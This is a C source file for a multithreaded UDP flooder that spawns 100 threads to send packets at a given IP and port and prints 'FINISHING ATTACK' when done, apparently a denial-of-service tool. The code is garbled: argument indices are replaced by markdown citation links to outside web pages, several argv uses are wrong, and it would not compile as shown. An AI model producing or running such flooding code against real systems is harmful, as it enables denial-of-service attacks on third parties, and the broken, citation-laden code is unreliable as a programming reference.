#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>

#define PCKT_LEN 8192 // Packet length
#define NUM_THREADS 100 // Number of threads

typedef struct {
    char *ip;
    int port;
    int num_packets;
    int send_rate;
} thread_data_t;

void *send_packets(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char buffer[PCKT_LEN];

    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket creation failed");
        return NULL;
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);

    for (int i = 0; i < data->num_packets; i++) {
        // Generate a simple payload
        snprintf(buffer, sizeof(buffer), "Packet %d from thread %ld", i, pthread_self());

        // Send packet
        sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));

        // Control the sending rate
        usleep(1000/ data->send_rate); // Adjust sleep time based on send rate
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <port> <Time> <threads>\n", argv);
        exit(EXIT_FAILURE);
    }

    char *ip = argv[[1]](https://stackoverflow.com/questions/78184/how-do-i-create-raw-tcp-ip-packets-in-c);
    int port = atoi(argv[[2]](https://github.com/zheng-da/high-speed-data-transfer/blob/master/raw-sender.c));
    int num_packets = atoi(argv[[3]](https://nmap.org/book/nping-man.html));
    int send_rate = atoi(argv);

    pthread_t threads[NUM_THREADS];
    thread_data_t thread_data[NUM_THREADS];

    // Create threads to send packets
    for (int i = 0; i < NUM_THREADS; i++) {
        thread_data[i].ip = ip;
        thread_data[i].port = port;
        thread_data[i].num_packets = num_packets / NUM_THREADS; // Distribute packets among threads
        thread_data[i].send_rate = send_rate;

        pthread_create(&threads[i], NULL, send_packets, (void *)&thread_data[i]);
    }

    // Wait for all threads to finish
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("FINISHING ATTACK .\n");
    return 0;
}
